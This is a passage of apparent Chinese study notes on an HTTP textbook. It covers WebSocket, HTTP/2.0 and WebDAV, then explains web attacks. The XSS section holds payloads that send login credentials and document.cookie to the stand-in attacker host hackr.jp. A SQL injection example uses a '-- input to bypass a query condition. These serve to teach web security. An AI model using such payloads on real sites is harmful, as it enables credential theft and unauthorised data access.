Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: chat
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。</p>
<p>成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数 据帧，而采用 WebSocket 独立的数据帧。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805153529353.png" alt="image-20220805153529353"></p>
<p>图：WebSocket 通信</p>
<ul>
<li>WebSocket API</li>
</ul>
<p>JavaScript 可调用“The WebSocket API”（http://www.w3.org/TR/websockets/，由 W3C 标准制定）内 提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通 信。</p>
<p>以下为调用 WebSocket API，每 50ms 发送一次数据的实例。</p>
<div class="language-javascript ext-js line-numbers-mode"><pre v-pre class="language-javascript"><code><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://game.example.com:12010/updates'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
socket<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>bufferedAmount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">getUpdateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="期盼已久的-http-2-0" tabindex="-1"><a class="header-anchor" href="#期盼已久的-http-2-0" aria-hidden="true">#</a> 期盼已久的 HTTP/2.0</h3>
<p>目前主流的 HTTP/1.1 标准，自 1999 年发布的 RFC2616 之后再未进 行过改订。SPDY 和 WebSocket 等技术纷纷出现，很难断言 HTTP/1.1 仍是适用于当下的 Web 的协议。</p>
<p>负责互联网技术标准的 IETF（Internet Engineering Task Force，互联网 工程任务组）创立 httpbis（Hypertext Transfer Protocol Bis，http://datatracker.ietf.org/wg/httpbis/）工作组，其目标是推进下一 代 HTTP——HTTP/2.0 在 2014 年 11 月实现标准化。</p>
<p><strong>HTTP/2.0 的特点</strong></p>
<p>HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验。由于基本上 都会先通过 HTTP/1.1 与 TCP 连接，现在我们以下面的这些协议为基 础，探讨一下它们的实现方法。</p>
<ul>
<li>
<p>SPDY</p>
</li>
<li>
<p>HTTP Speed ＋ Mobility</p>
</li>
<li>
<p>Network-Friendly HTTP Upgrade</p>
</li>
</ul>
<p>HTTP Speed ＋ Mobility 由微软公司起草，是用于改善并提高移动端 通信时的通信速度和性能的标准。它建立在 Google 公司提出的 SPDY 与 WebSocket 的基础之上。</p>
<p>Network-Friendly HTTP Upgrade 主要是在移动端通信时改善 HTTP 性 能的标准。</p>
<p><strong>HTTP/2.0 的 7 项技术及讨论</strong></p>
<p>HTTP/2.0 围绕着主要的 7 项技术进行讨论，现阶段（2012 年 8 月 13 日），大都倾向于采用以下协议的技术。但是，讨论仍在持续，所以 不能排除会发生重大改变的可能性。</p>
<p>表 9-1</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805154616224.png" alt="image-20220805154616224"></p>
<p>注：HTTP Speed ＋ Mobility 简写为 Speed ＋ Mobility，Network-Friendly HTTP Upgrade 简写为 Friendly。</p>
<h3 id="web-服务器管理文件的-webdav" tabindex="-1"><a class="header-anchor" href="#web-服务器管理文件的-webdav" aria-hidden="true">#</a> Web 服务器管理文件的 WebDAV</h3>
<p>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网 的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进 行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。</p>
<p>除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编 辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的 版本控制功能。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805162102401.png" alt="image-20220805162102401"></p>
<p>图：WebDAV</p>
<p>使用 HTTP/1.1 的 PUT 方法和 DELETE 方法，就可以对 Web 服务器 上的文件进行创建和删除操作。可是出于安全性及便捷性等考虑，一 般不使用。</p>
<h4 id="扩展-http-1-1-的-webdav" tabindex="-1"><a class="header-anchor" href="#扩展-http-1-1-的-webdav" aria-hidden="true">#</a> 扩展 HTTP/1.1 的 WebDAV</h4>
<p>针对服务器上的资源，WebDAV 新增加了一些概念，如下所示。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805162242808.png" alt="image-20220805162242808"></p>
<p>图：WebDAV 扩展的概念</p>
<p>集合（<strong>Collection</strong>）：是一种统一管理多个资源的概念。以集合为 单位可进行各种操作。也可实现类似集合的集合这样的叠加。</p>
<p>资源（<strong>Resource</strong>）：把文件或集合称为资源。</p>
<p>属性（<strong>Property</strong>）：定义资源的属性。定义以“名称 = 值”的格式执 行。</p>
<p>锁（<strong>Lock</strong>）：把文件设置成无法编辑状态。多人同时编辑时，可 防止在同一时间进行内容写入。</p>
<h4 id="webdav-内新增的方法及状态码" tabindex="-1"><a class="header-anchor" href="#webdav-内新增的方法及状态码" aria-hidden="true">#</a> WebDAV 内新增的方法及状态码</h4>
<p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方 法。</p>
<p><strong>PROPFIND</strong> ：获取属性</p>
<p><strong>PROPPATCH</strong> ：修改属性</p>
<p><strong>MKCOL</strong> ：创建集合</p>
<p><strong>COPY</strong> ：复制资源及属性</p>
<p><strong>MOVE</strong> ：移动资源</p>
<p><strong>LOCK</strong> ：资源加锁</p>
<p><strong>UNLOCK</strong> ：资源解锁</p>
<p>为配合扩展的方法，状态码也随之扩展。</p>
<p><strong>102 Processing</strong> ：可正常处理请求，但目前是处理中状态</p>
<p><strong>207 Multi-Status</strong> ：存在多种状态</p>
<p><strong>422 Unprocessible Entity</strong> ：格式正确，内容有误 423 Locked ：资源已被加锁</p>
<p><strong>424 Failed Dependency</strong> ：处理与某请求关联的请求失败，因此不再维持依赖关系</p>
<p><strong>507 Insufficient Storage</strong> ：保存空间不足</p>
<ul>
<li>WebDAV 的请求实例</li>
</ul>
<p>下面是使用 PROPFIND 方法对 http://www.example.com/file 发起 获取属性的请求。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>PROPFIND /file HTTP/1.1
Host: www.example.com
Content-Type: application/xml; charset="utf-8"
Content-Length: 219
&lt;?xml version="1.0" encoding="utf-8" ?>
&lt;D:propfind xmlns:D="DAV:">
&lt;D:prop xmlns:R="http://ns.example.com/boxschema/">
&lt;R:bigbox/>
&lt;R:author/>
&lt;R:DingALing/>
&lt;R:Random/>
&lt;/D:prop>
&lt;/D:propfind>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li>
<p>WebDAV 的响应实例</p>
<p>下面是针对之前的 PROPFIND 方法，返回 http://www.example.com/file 的属性的响应。</p>
</li>
</ul>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>HTTP/1.1 207 Multi-Status
Content-Type: application/xml; charset="utf-8"
Content-Length: 831
&lt;?xml version="1.0" encoding="utf-8" ?>
&lt;D:multistatus xmlns:D="DAV:">
&lt;D:response xmlns:R="http://ns.example.com/boxschema/">
&lt;D:href>http://www.example.com/file&lt;/D:href>
&lt;D:propstat>
&lt;D:prop>
&lt;R:bigbox>
&lt;R:BoxType>Box type A&lt;/R:BoxType>
&lt;/R:bigbox>
&lt;R:author>
&lt;R:Name>J.J. Johnson&lt;/R:Name>
&lt;/R:author>
&lt;/D:prop>
&lt;D:status>HTTP/1.1 200 OK&lt;/D:status>
&lt;/D:propstat>
&lt;D:propstat>
&lt;D:prop>&lt;R:DingALing/>&lt;R:Random/>&lt;/D:prop>
&lt;D:status>HTTP/1.1 403 Forbidden&lt;/D:status>
&lt;D:responsedescription> The user does not have access to the DingALing property.
&lt;/D:responsedescription>
&lt;/D:propstat>
&lt;/D:response>
&lt;D:responsedescription> There has been an access violation error.
&lt;/D:responsedescription>
&lt;/D:multistatus>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
<p><strong>为何 HTTP 协议受众如此广泛</strong></p>
<p>本章讲解了几个与 HTTP 相关联的协议使用案例。为什么 HTTP 协 议受众能够如此广泛呢？</p>
<p>过去，新编写接入互联网的系统或软件时，还需要同时编写实现与 必要功能对应的新协议。但最近，使用 HTTP 的系统和软件占了绝大多数。</p>
<p>这有着诸多原因，其中与企业或组织的防火墙设定有着莫大的关 系。防火墙的基本功能就是禁止非指定的协议和端口号的数据包通 过。因此如果使用新协议或端口号则必须修改防火墙设置。</p>
<p>互联网上，使用率最高的当属 Web。不管是否具备访问 FTP 和 SSH 的权限，一般公司都会开放对 Web 的访问。Web 是基于 HTTP 协议运作的，因此在构建 Web 服务器或访问 Web 站点时，需事先 设置防火墙 HTTP（80/tcp）和 HTTPS（443/tcp）的权限。</p>
<p>许多公司或组织已设定权限将 HTTP 作为通信环境，因此无须再修 改防火墙的设定。可见 HTTP 具有导入简单这一大优势。而这也是 基于 HTTP 服务或内容不断增加的原因之一。</p>
<p>还有一些其他原因，比如，作为 HTTP 客户端的浏览器已相当普 遍，HTTP 服务器的数量已颇具规模，HTTP 本身就是优异的应用 等。</p>
</blockquote>
<h2 id="web-的攻击技术" tabindex="-1"><a class="header-anchor" href="#web-的攻击技术" aria-hidden="true">#</a> Web 的攻击技术</h2>
<h3 id="针对-web-的攻击技术" tabindex="-1"><a class="header-anchor" href="#针对-web-的攻击技术" aria-hidden="true">#</a> 针对 Web 的攻击技术</h3>
<p>简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会 成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服 务器上的 Web 应用等资源才是攻击目标。</p>
<p>目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把 Web 应用作为攻击目标。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805173057685.png" alt="image-20220805173057685"></p>
<p>图：攻击事件倾向</p>
<h4 id="http-不具备必要的安全功能" tabindex="-1"><a class="header-anchor" href="#http-不具备必要的安全功能" aria-hidden="true">#</a> HTTP 不具备必要的安全功能</h4>
<p>与最初的设计相比，现今的 Web 网站应用的 HTTP 协议的使用方式 已发生了翻天覆地的变化。几乎现今所有的 Web 网站都会使用会话 （session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并 不具备这些功能。</p>
<p>从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多 优势，但是在安全性方面则呈劣势。</p>
<p>就拿远程登录时会用到的 SSH 协议来说，SSH 具备协议级别的认证 及会话管理等功能，HTTP 协议则没有。另外在架设 SSH 服务方面， 任何人都可以轻易地创建安全等级高的服务，而 HTTP 即使已架设好 服务器，但若想提供服务器基础上的 Web 应用，很多情况下都需要 重新开发。</p>
<p>因此，开发者需要自行设计并开发认证及会话管理功能来满足 Web 应用的安全。而自行设计就意味着会出现各种形形色色的实现。结 果，安全等级并不完备，可仍在运作的 Web 应用背后却隐藏着各种 容易被攻击者滥用的安全漏洞的 Bug。</p>
<h4 id="在客户端即可篡改请求" tabindex="-1"><a class="header-anchor" href="#在客户端即可篡改请求" aria-hidden="true">#</a> 在客户端即可篡改请求</h4>
<p>在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可 以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期 数据不相同的内容。</p>
<p>在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。 通过 URL查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传 入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或 被攻击者拿到管理权限。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805174046298.png" alt="image-20220805174046298"></p>
<p>图：对 Web 应用的攻击</p>
<h4 id="针对-web-应用的攻击模式" tabindex="-1"><a class="header-anchor" href="#针对-web-应用的攻击模式" aria-hidden="true">#</a> 针对 Web 应用的攻击模式</h4>
<p>针对 Web 应用的攻击模式</p>
<ul>
<li>主动攻击</li>
<li>被动攻击</li>
<li>以服务器为目标的主动攻击</li>
</ul>
<p>主动攻击（active attack）是指攻击者通过直接访问 Web 应用， 把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的 资源进行攻击，因此攻击者需要能够访问到那些资源。</p>
<p>主动攻击模式里具有代表性的攻击是 SQL注入攻击和 OS 命令注 入攻击。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805174345114.png" alt="image-20220805174345114"></p>
<p>图：主动攻击</p>
<ul>
<li>以服务器为目标的被动攻击</li>
</ul>
<p>被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻 击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访 问发起攻击。</p>
<p>被动攻击通常的攻击模式如下所示。</p>
<p><strong>步骤 1</strong>： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。</p>
<p><strong>步骤 2</strong>： 当用户不知不觉中招之后，用户的浏览器或邮件客户端 就会触发这个陷阱。</p>
<p><strong>步骤 3</strong>： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发 送给作为攻击目标的 Web 应用，运行攻击代码。</p>
<p><strong>步骤 4</strong>： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取， 登录状态中的用户权限遭恶意滥用等后果。</p>
<p>被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805174910060.png" alt="image-20220805174910060"></p>
<p>图：被动攻击</p>
<p>利用用户的身份攻击企业内部网络</p>
<p>利用被动攻击，可发起对原本从互联网上无法直接访问的企业内 网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户 能够访问到的网络范围内，即使是企业内网也同样会受到攻击。</p>
<p>很多企业内网依然可以连接到互联网上，访问 Web 网站，或接 收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805175359515.png" alt="image-20220805175359515"></p>
<p>图：利用被动攻击对企业内网发动攻击</p>
<h3 id="因输出值转义不完全引发的安全漏洞" tabindex="-1"><a class="header-anchor" href="#因输出值转义不完全引发的安全漏洞" aria-hidden="true">#</a> 因输出值转义不完全引发的安全漏洞</h3>
<p>实施 Web 应用的安全对策可大致分为以下两部分。</p>
<ul>
<li>
<p>客户端的验证</p>
</li>
<li>
<p>Web 应用端（服务器端）的验证</p>
<ul>
<li>输入值验证</li>
<li>输出值转义</li>
</ul>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808111255725.png" alt="image-20220808111255725"></p>
<p>图：验证数据的几个地方</p>
</li>
</ul>
<p>多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡 改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范 对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI 体验的作用。</p>
<p>Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是 具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业 务逻辑的数值或检查字符编码等预防对策。</p>
<p>从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之 际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转 义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
<h4 id="跨站脚本攻击" tabindex="-1"><a class="header-anchor" href="#跨站脚本攻击" aria-hidden="true">#</a> 跨站脚本攻击</h4>
<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML标签或 JavaScript 进 行的一种攻击。动态创建的 HTML部分有可能隐藏着安全漏洞。就 这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一 不小心就会受到被动攻击。</p>
<p>跨站脚本攻击有可能造成以下影响。</p>
<ul>
<li>利用虚假输入表单骗取用户个人信息。</li>
<li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下， 帮助攻击者发送恶意请求。</li>
<li>显示伪造的文章或图片。</li>
<li>跨站脚本攻击案例</li>
</ul>
<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于 攻击的陷阱。</p>
<p>下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表 单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808112048619.png" alt="image-20220808112048619"></p>
<p>充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶 意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页 面内，诱使用户去点击该 URL。</p>
<p>浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的 脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后， 就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808112647243.png" alt="image-20220808112647243"></p>
<p>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登 录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
<blockquote>
<p>对 http://example.jp/login?ID=yama 请求时对应的 HTML 源代码（摘录）</p>
</blockquote>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;div class="logo">
&lt;img src="/img/logo.gif" alt="E! 拍卖会" />
&lt;/div>
&lt;form action="http://example.jp/login" method="post" id="login">
&lt;div class="input_id">
ID &lt;input type="text" name="ID" value="yama" />
&lt;/div>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
<p>http://example.jp/login?ID=&quot;&gt;
<code v-pre>&lt;script&gt;var f=document.getElementById(&quot;login&quot;);f.action=&quot;http://hackr.jp/pwget&quot;;f.method=&quot;get&quot;; &lt;/script&gt;&lt;span+s=&quot;</code> 对请求时对应的HTML源代码（摘录）</p>
</blockquote>
<div class="language-html ext-html line-numbers-mode"><pre v-pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
&lt;img src="/img/logo.gif" alt="E! 拍卖会 />
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://example.jp/login<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
ID <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ID<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> f<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> f<span class="token punctuation">.</span>action<span class="token operator">=</span><span class="token string">"http://hackr.jp/pwget"</span><span class="token punctuation">;</span> f<span class="token punctuation">.</span>method<span class="token operator">=</span><span class="token string">"get"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>&lt;span s="
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li>对用户 Cookie 的窃取攻击</li>
</ul>
<p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够 以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;script src=http://hackr.jp/xss.js>&lt;/script>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>该脚本内指定的 http://hackr.jp/xss.js 文件。即下面这段采用 JavaScript 编写的代码。</p>
<div class="language-javascript ext-js line-numbers-mode"><pre v-pre class="language-javascript"><code><span class="token keyword">var</span> content <span class="token operator">=</span> <span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;img src=http://hackr.jp/?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信 息。然 后这些信息会发送至攻击者的 Web 网站 （http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这 样窃取到用户的 Cookie 信息了。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808113532789.png" alt="image-20220808113532789"></p>
<p>图：使用 XSS 攻击夺取 Cookie 信息</p>
<h4 id="sql-注入攻击" tabindex="-1"><a class="header-anchor" href="#sql-注入攻击" aria-hidden="true">#</a> SQL 注入攻击</h4>
<ul>
<li>会执行非法 SQL 的 SQL 注入攻击</li>
</ul>
<p>SQL注入（SQLInjection）是指针对 Web 应用使用的数据库，通 过运行非法的 SQL而产生的攻击。该安全隐患有可能引发极大 的威胁，有时会直接导致个人信息及机密信息的泄露。</p>
<p>Web 应用通常都会用到数据库，当需要对数据库表内的数据进行 检索或添加、删除等操作时，会使用 SQL语句连接数据库进行 特定的操作。如果在调用 SQL语句的方式上存在疏漏，就有可 能执行被恶意注入（Injection）非法 SQL语句。</p>
<p>​	SQL注入攻击有可能会造成以下等影响。</p>
<ol>
<li>非法查看或篡改数据库内的数据</li>
<li>规避认证</li>
<li>执行和数据库服务器业务关联的程序等</li>
</ol>
<ul>
<li>SQL 注入攻击案例</li>
</ul>
<p>下面以某个购物网站的搜索功能为例，讲解 SQL注入攻击。通 过该功能，我们可以将某作者的名字作为搜索关键字，查找该作 者的所有著作。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808114202049.png" alt="image-20220808114202049"></p>
<p>图：SQL 注入攻击案例</p>
<p>正常处理的操作示例</p>
<p>下图是将“上野宣”作为关键字的搜索结果。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808114312877.png" alt="image-20220808114312877"></p>
<p>图：正常处理操作的示例</p>
<p>URL的查询字段已指定 q= 上野宣，这个值由 Web 应用传入到 SQL语句中，构成下方的 SQL语句。</p>
<div class="language-sql ext-sql line-numbers-mode"><pre v-pre class="language-sql"><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> bookTbl <span class="token keyword">WHERE</span> author <span class="token operator">=</span> <span class="token string">'上野宣'</span> <span class="token operator">and</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>该 SQL语句表示“从 bookTbl 表中，显示满足 author= 上野宣 and flag=1（可售）所在行的数据”。</p>
<p>数据库内的 bookTbl 表记录着该购物网站的所有书籍信息。通过 SQL语句，将满足作者名（author）上野宣并且 flag 为 1 双重条 件的条目取出，最后作为搜索结果显示出来。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808114458177.png" alt="image-20220808114458177"></p>
<p>图：数据库处理</p>
<p>SQL 注入攻击的操作示例</p>
<p>把刚才指定查询字段的上野宣改写成“上野宣'--”。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808114543709.png" alt="image-20220808114543709"></p>
<p>图：SQL 注入攻击的操作示例</p>
<p>构成的 SQL语句就变成“从数据库的 bookTbl 表中，显示满足 author= 上野宣条件所在行的数据”，如下所示。</p>
<div class="language-sql ext-sql line-numbers-mode"><pre v-pre class="language-sql"><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> bookTbl <span class="token keyword">WHERE</span> author <span class="token operator">=</span><span class="token string">'上野宣'</span> <span class="token operator">-</span> <span class="token operator">-</span>' <span class="token operator">and</span> flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>SQL语句中的 -- 之后全视为注释。即，and flag=1 这个条件被自 动忽略了。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808114818709.png" alt="image-20220808114818709"></p>
<p>图：数据库处理</p>
<p>结果跟 flag 的设定值无关，只取出满足 author=“上野宣”条件所 在行的数据，这样连那些尚未出版的书籍也一并显示出来了。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808114953547.png" alt="image-20220808114953547"></p>
<p>图：被 SQL 注入的后果</p>
<ul>
<li>SQL 注入攻击破坏 SQL 语句结构的案例</li>
</ul>
<p>SQL注入是攻击者将 SQL语句改变成开发者意想不到的形式以 达到破坏结构的攻击。</p>
<p>比如，在之前的攻击案例中，就会把 author 的字面值（程序中使 用 的常量）&quot; 上野宣 '--&quot; 的字符串赋值给 $q。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808115645801.png" alt="image-20220808115645801"></p>
<p>图：SQL 注入攻击的原理</p>
<p>上图中颜色标记的字符串最开始的单引号 (') 表示会将 author 的 字面值括起来，以到达第二个单引号后作为结束。因此，author 的字面值就成了上野宣，而后面的 -- 则不再属于 author 字面 值，会被解析成其他的句法。</p>
